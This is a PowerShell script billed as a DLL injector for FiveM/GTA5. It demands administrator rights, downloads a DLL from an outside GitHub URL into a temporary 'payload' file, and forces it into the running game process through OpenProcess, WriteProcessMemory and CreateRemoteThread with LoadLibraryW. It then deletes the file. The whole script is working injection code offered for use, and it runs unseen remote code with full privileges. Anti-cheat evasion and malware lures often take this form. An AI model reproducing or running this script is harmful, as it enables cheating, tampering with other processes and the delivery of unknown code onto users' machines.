$dllUrl = "https://raw.githubusercontent.com/potoguide/Auden.tded/main/67.dll"
$procName = "FiveM_GTAProcess"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "    DLL INJECTOR FOR FIVEM/GTA5" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "[-] Please run as Administrator!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

Write-Host "[*] Looking for $procName ..." -ForegroundColor Yellow
$process = Get-Process -Name $procName -ErrorAction SilentlyContinue
if (-not $process) {
    Write-Host "[-] Process not found! Start FiveM first." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}
$targetPid = $process.Id
Write-Host "[+] Found PID: $targetPid" -ForegroundColor Green

Write-Host "[*] Downloading DLL..." -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri $dllUrl -UseBasicParsing
    $dllBytes = $response.Content
    Write-Host "[+] Downloaded $($dllBytes.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

$tempPath = "$env:TEMP\payload_$(Get-Random).dll"
[System.IO.File]::WriteAllBytes($tempPath, $dllBytes)
Write-Host "[+] Temp DLL: $tempPath" -ForegroundColor Green

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out uint e);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out uint g);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] public static extern IntPtr GetModuleHandle(string a);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr a, string b);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr a);
}
"@

$hProcess = [WinAPI]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq 0) {
    Write-Host "[-] Open failed! Run as Administrator" -ForegroundColor Red
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    Read-Host "Press Enter to exit"
    exit
}

$bytes = [System.Text.Encoding]::Unicode.GetBytes($tempPath + "`0")
$remote = [WinAPI]::VirtualAllocEx($hProcess, 0, $bytes.Length, 0x3000, 0x04)
[WinAPI]::WriteProcessMemory($hProcess, $remote, $bytes, $bytes.Length, [ref]0)

$loadLib = [WinAPI]::GetProcAddress([WinAPI]::GetModuleHandle("kernel32"), "LoadLibraryW")
$tid = 0
$thread = [WinAPI]::CreateRemoteThread($hProcess, 0, 0, $loadLib, $remote, 0, [ref]$tid)

if ($thread -ne 0) {
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "    INJECTION SUCCESSFUL!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  PID: $targetPid" -ForegroundColor White
    Write-Host "  Thread ID: $tid" -ForegroundColor White
    Write-Host "========================================" -ForegroundColor Green
} else {
    Write-Host "[-] Injection failed!" -ForegroundColor Red
}

[WinAPI]::CloseHandle($hProcess)
Start-Sleep -Seconds 3
Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
Write-Host ""
Write-Host "[+] Cleanup completed" -ForegroundColor Green
Read-Host "Press Enter to exit"
